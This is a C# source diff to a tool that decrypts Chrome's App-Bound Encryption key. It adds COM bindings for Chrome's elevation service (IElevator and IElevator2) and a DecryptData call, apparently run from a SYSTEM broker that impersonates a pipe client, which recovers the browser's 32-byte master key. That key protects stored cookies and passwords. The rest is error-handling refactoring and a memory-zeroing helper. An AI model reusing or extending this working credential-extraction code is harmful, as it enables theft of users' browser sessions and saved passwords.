@@ -664,7 +664,16 @@ internal static class Program
             }
             catch (Exception ex)
             {
-                throw new StageException("stage_system_dpapi:" + ex.GetType().Name);
+                // Chrome 144+ wraps the outer layer inside the elevation service
+                // itself; plain DPAPI cannot open it anymore. Ask the elevator COM
+                // object (IElevator2 preferred, v1 fallback) to decrypt the whole
+                // blob — DecryptData returns the final 32-byte key. We run inside
+                // the SYSTEM broker, the context the service accepts.
+                string dpapiHr = "0x" + ex.HResult.ToString("X8") + ":" + (ex.InnerException != null ? ex.InnerException.Message : ex.Message).Replace(' ', '_');
+                string elevatorDetail;
+                byte[] elevatorKey = TryElevatorDecrypt(encryptedKey, out elevatorDetail);
+                if (elevatorKey != null && elevatorKey.Length == 32) return elevatorKey;
+                throw new StageException("stage_dpapi:" + dpapiHr + "|elevator:" + elevatorDetail);
             }
             if (!ImpersonateNamedPipeClient(pipeHandle.DangerousGetHandle()))
                 throw new StageException("stage_impersonate:" + Marshal.GetLastWin32Error());
@@ -688,7 +697,7 @@ internal static class Program
             }
             catch (Exception ex)
             {
-                throw new StageException("stage_parse:" + ex.GetType().Name + ":len" + (userPlaintext?.Length ?? -1));
+                throw new StageException("stage_parse:" + ex.GetType().Name + ":len" + (userPlaintext == null ? -1 : userPlaintext.Length));
             }
             try
             {
@@ -701,15 +710,17 @@ internal static class Program
             catch (CngException) { throw; }
             catch (UnsupportedKeyException)
             {
+                int deriveLen = content == null ? -1 : content.Length;
                 throw new StageException(
-                    "stage_derive:flag" + (content != null && content.Length > 0 ? content[0].ToString() : "?") +
-                    ":len" + (content?.Length ?? -1));
+                    "stage_derive:flag" + (deriveLen > 0 ? content[0].ToString() : "?") +
+                    ":len" + deriveLen);
             }
             catch (Exception ex)
             {
+                int tagLen = content == null ? -1 : content.Length;
                 throw new StageException(
-                    "stage_tag:flag" + (content != null && content.Length > 0 ? content[0].ToString() : "?") +
-                    ":len" + (content?.Length ?? -1) + ":" + ex.GetType().Name);
+                    "stage_tag:flag" + (tagLen > 0 ? content[0].ToString() : "?") +
+                    ":len" + tagLen + ":" + ex.GetType().Name);
             }
             finally
             {
@@ -726,9 +737,203 @@ internal static class Program
 
     private sealed class StageException : Exception
     {
-        internal StageException(string reason) : base(reason) { Reason = reason; }
-        internal string Reason { get; }
+        private readonly string _reason;
+        internal StageException(string reason) : base(reason) { _reason = reason; }
+        internal string Reason { get { return _reason; } }
     }
+
+    // ── Chrome elevation-service COM (IElevator / IElevator2, Chrome 144+) ──
+    // Same vtable layout for DecryptData; only the IID differs (xaitax reference).
+    [ComImport]
+    [Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8")]
+    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    private interface IElevatorChromium
+    {
+        [PreserveSig] int RunRecoveryCRXElevated(string crxPath, string browserVersion, string sessionId, string source, int callerProcessId, out ulong handle);
+        [PreserveSig] int EncryptData(int protectionLevel, IntPtr plaintext, out IntPtr ciphertext, out int lastError);
+        [PreserveSig] int DecryptData(IntPtr encrypted, out IntPtr plaintext, out int lastError);
+    }
+
+    [ComImport]
+    [Guid("1BF5208B-295F-4992-B5F4-3A9BB6494838")]
+    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    private interface IElevatorChromium2
+    {
+        [PreserveSig] int RunRecoveryCRXElevated(string crxPath, string browserVersion, string sessionId, string source, int callerProcessId, out ulong handle);
+        [PreserveSig] int EncryptData(int protectionLevel, IntPtr plaintext, out IntPtr ciphertext, out int lastError);
+        [PreserveSig] int DecryptData(IntPtr encrypted, out IntPtr plaintext, out int lastError);
+    }
+
+    private static readonly Guid ElevatorClsid = new Guid("708860E0-F641-4611-8895-7D867DD3675B");
+
+    private static readonly Guid IidElevatorV1 = new Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8");
+    private static readonly Guid IidElevatorV2 = new Guid("1BF5208B-295F-4992-B5F4-3A9BB6494838");
+
+    private static byte[] TryElevatorDecrypt(byte[] encryptedKey, out string detail)
+    {
+        Guid clsid = ElevatorClsid;
+        Guid iidV2 = IidElevatorV2;
+        Guid iidV1 = IidElevatorV1;
+        IntPtr unk = IntPtr.Zero;
+        detail = "exception";
+        try
+        {
+            int hr = CoInitializeEx(IntPtr.Zero, 0 /* COINIT_APARTMENTTHREADED */);
+            bool coInitialized = hr >= 0;
+            try
+            {
+                // IElevator2 first (Chrome 144+), v1 fallback.
+                hr = CoCreateInstance(ref clsid, IntPtr.Zero, 4 /* CLSCTX_LOCAL_SERVER */,
+                    ref iidV2, out unk);
+                if (hr >= 0 && unk != IntPtr.Zero)
+                {
+                    SetProxyBlanket(unk);
+                    object elevator = Marshal.GetObjectForIUnknown(unk);
+                    Marshal.Release(unk);
+                    unk = IntPtr.Zero;
+                    IElevatorChromium2 e2 = elevator as IElevatorChromium2;
+                    if (e2 != null)
+                    {
+                        string d2;
+                        byte[] key = CallDecryptDataV2(e2, encryptedKey, out d2);
+                        if (key != null) { detail = "ok_v2"; return key; }
+                        detail = "decrypt_v2:" + d2;
+                    }
+                    else detail = "cast_v2_failed";
+                }
+                else detail = "cocreate_v2:0x" + hr.ToString("X8");
+
+                hr = CoCreateInstance(ref clsid, IntPtr.Zero, 4,
+                    ref iidV1, out unk);
+                if (hr < 0 || unk == IntPtr.Zero)
+                {
+                    detail += "|cocreate_v1:0x" + hr.ToString("X8");
+                    return null;
+                }
+                SetProxyBlanket(unk);
+                object elevatorV1 = Marshal.GetObjectForIUnknown(unk);
+                Marshal.Release(unk);
+                unk = IntPtr.Zero;
+                IElevatorChromium e1 = elevatorV1 as IElevatorChromium;
+                if (e1 == null)
+                {
+                    detail += "|cast_v1_failed";
+                    return null;
+                }
+                string d1;
+                byte[] keyV1 = CallDecryptDataV1(e1, encryptedKey, out d1);
+                if (keyV1 != null) { detail = "ok_v1"; return keyV1; }
+                detail += "|decrypt_v1:" + d1;
+                return null;
+            }
+            finally
+            {
+                if (coInitialized) CoUninitialize();
+            }
+        }
+        catch (Exception ex)
+        {
+            detail = "ex:" + ex.GetType().Name + ":0x" + Marshal.GetHRForException(ex).ToString("X8");
+            return null;
+        }
+        finally
+        {
+            if (unk != IntPtr.Zero) Marshal.Release(unk);
+        }
+    }
+
+    private static void SetProxyBlanket(IntPtr proxy)
+    {
+        CoSetProxyBlanket(proxy,
+            0xFFFFFFFF /* RPC_C_AUTHN_DEFAULT */, 0xFFFFFFFF /* RPC_C_AUTHZ_DEFAULT */,
+            IntPtr.Zero /* COLE_DEFAULT_PRINCIPAL */,
+            6 /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */, 3 /* RPC_C_IMP_LEVEL_IMPERSONATE */,
+            IntPtr.Zero, 0x40 /* EOAC_DYNAMIC_CLOAKING */);
+    }
+
+    private static byte[] CallDecryptDataV2(IElevatorChromium2 elevator, byte[] encryptedKey, out string detail)
+    {
+        IntPtr bstrIn = IntPtr.Zero;
+        IntPtr bstrOut = IntPtr.Zero;
+        detail = "exception";
+        try
+        {
+            bstrIn = SysAllocStringByteLen(encryptedKey, (uint)encryptedKey.Length);
+            int lastError;
+            int hr = elevator.DecryptData(bstrIn, out bstrOut, out lastError);
+            if (hr < 0) { detail = "hr=0x" + hr.ToString("X8") + ":comErr=" + lastError; return null; }
+            if (bstrOut == IntPtr.Zero) { detail = "hr=0:empty:comErr=" + lastError; return null; }
+            return CopySysString(bstrOut);
+        }
+        catch (Exception ex)
+        {
+            detail = "ex:" + ex.GetType().Name + ":0x" + Marshal.GetHRForException(ex).ToString("X8");
+            return null;
+        }
+        finally
+        {
+            if (bstrIn != IntPtr.Zero) SysFreeString(bstrIn);
+            if (bstrOut != IntPtr.Zero) SysFreeString(bstrOut);
+        }
+    }
+
+    private static byte[] CallDecryptDataV1(IElevatorChromium elevator, byte[] encryptedKey, out string detail)
+    {
+        IntPtr bstrIn = IntPtr.Zero;
+        IntPtr bstrOut = IntPtr.Zero;
+        detail = "exception";
+        try
+        {
+            bstrIn = SysAllocStringByteLen(encryptedKey, (uint)encryptedKey.Length);
+            int lastError;
+            int hr = elevator.DecryptData(bstrIn, out bstrOut, out lastError);
+            if (hr < 0) { detail = "hr=0x" + hr.ToString("X8") + ":comErr=" + lastError; return null; }
+            if (bstrOut == IntPtr.Zero) { detail = "hr=0:empty:comErr=" + lastError; return null; }
+            return CopySysString(bstrOut);
+        }
+        catch (Exception ex)
+        {
+            detail = "ex:" + ex.GetType().Name + ":0x" + Marshal.GetHRForException(ex).ToString("X8");
+            return null;
+        }
+        finally
+        {
+            if (bstrIn != IntPtr.Zero) SysFreeString(bstrIn);
+            if (bstrOut != IntPtr.Zero) SysFreeString(bstrOut);
+        }
+    }
+
+    private static byte[] CopySysString(IntPtr bstr)
+    {
+        int len = SysStringByteLen(bstr);
+        if (len <= 0) return null;
+        byte[] result = new byte[len];
+        Marshal.Copy(bstr, result, 0, len);
+        return result;
+    }
+
+    [DllImport("ole32.dll")]
+    private static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);
+
+    [DllImport("ole32.dll")]
+    private static extern void CoUninitialize();
+
+    [DllImport("ole32.dll")]
+    private static extern int CoCreateInstance(ref Guid rclsid, IntPtr pUnkOuter, uint dwClsContext, ref Guid riid, out IntPtr ppv);
+
+    [DllImport("ole32.dll")]
+    private static extern int CoSetProxyBlanket(IntPtr pProxy,
+        uint dwAuthnSvc, uint dwAuthzSvc, IntPtr pServerPrincName,
+        uint dwAuthnLevel, uint dwImpLevel, IntPtr pAuthInfo, uint dwCapabilities);
+
+    [DllImport("oleaut32.dll")]
+    private static extern IntPtr SysAllocStringByteLen(byte[] str, uint len);
+
+    [DllImport("oleaut32.dll")]
+    private static extern void SysFreeString(IntPtr bstr);
+
+    [DllImport("oleaut32.dll")]
+    private static extern int SysStringByteLen(IntPtr bstr);
 
     private static ParsedAppBoundBlob ParseAppBoundBlob(byte[] data)
     {
@@ -1061,7 +1266,7 @@ internal static class Program
             inputHandle.Free();
             if (output.pbData != IntPtr.Zero)
             {
-                RtlSecureZeroMemory(output.pbData, new UIntPtr((uint)Math.Max(0, output.cbData)));
+                ZeroNativeMemory(output.pbData, output.cbData);
                 LocalFree(output.pbData);
             }
         }
@@ -1533,8 +1738,19 @@ internal static class Program
     private static extern bool CryptUnprotectData(ref DataBlob input, IntPtr description, IntPtr entropy,
         IntPtr reserved, IntPtr prompt, int flags, ref DataBlob output);
     [DllImport("kernel32.dll")] private static extern IntPtr LocalFree(IntPtr memory);
-    [DllImport("kernel32.dll", EntryPoint = "RtlSecureZeroMemory")]
-    private static extern IntPtr RtlSecureZeroMemory(IntPtr destination, UIntPtr length);
+    private static readonly byte[] ZeroBuffer = new byte[256];
+
+    private static void ZeroNativeMemory(IntPtr destination, int length)
+    {
+        if (destination == IntPtr.Zero || length <= 0) return;
+        int offset = 0;
+        while (offset < length)
+        {
+            int chunk = Math.Min(ZeroBuffer.Length, length - offset);
+            Marshal.Copy(ZeroBuffer, 0, new IntPtr(destination.ToInt64() + offset), chunk);
+            offset += chunk;
+        }
+    }
     [DllImport("advapi32.dll", SetLastError = true)] private static extern bool ImpersonateNamedPipeClient(IntPtr pipe);
     [DllImport("advapi32.dll", SetLastError = true)] private static extern bool RevertToSelf();
 
